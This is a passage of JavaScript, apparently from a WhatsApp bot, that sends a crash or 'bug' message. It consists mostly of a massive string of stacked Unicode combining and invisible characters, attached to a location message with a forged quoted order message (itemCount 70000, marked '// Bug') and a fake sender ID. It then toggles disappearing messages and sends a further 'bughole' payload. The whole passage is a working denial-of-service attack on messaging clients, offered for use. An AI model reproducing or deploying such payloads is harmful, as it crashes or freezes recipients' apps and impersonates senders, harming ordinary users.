̢͙̘̤͙̱̘͓̭͔̩͙̮̰͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̴̡̧̛̛̛̯̠͔̟͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭̿̿̀̊̒́̀̌̂̔̍̓͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚͡⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̵̢̧̧̘͇͙̟̫͎͎̹̹̼͓̞͈͖̲͎̙̞͎͖̙̩̘̍̐̿̈́̈́͊͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̴̡̧̛̛̛̯̠͔̟͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭̿̿̀̊̒́̀̌̂̔̍̓͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚͡⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̵̢̧̧̘͇͙̟̫͎͎̹̹̼͓̞͈͖̲͎̙̞͎͖̙̩̘̍̐̿̈́̈́͊͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̛̯̠͔̟̿̿̀̊̒́̀̌̂̔̍̓͡',
                        jpegThumbnail: bro },location,{
 quoted: {
  key: {
   participant: '111111111@s.whatsapp.net' // Fake sender Jid
  },
  message: {
   orderMessage: {
    itemCount: 70000, // Bug
    status: 1,
    surface: 1,
     message: 'ʀᴀɴᴢ̷',
    orderTitle: 'fake', // 
    sellerJid: '0@s.whatsapp.net' // Seller
   }
  }
 }
})

await zoe.toggleDisappearingMessages(from,`MODAR`,text)
zoe.sendMessage(from, bughole(prefix), text)
await zoe.toggleDisappearingMessages(from,`MODAR`,text)
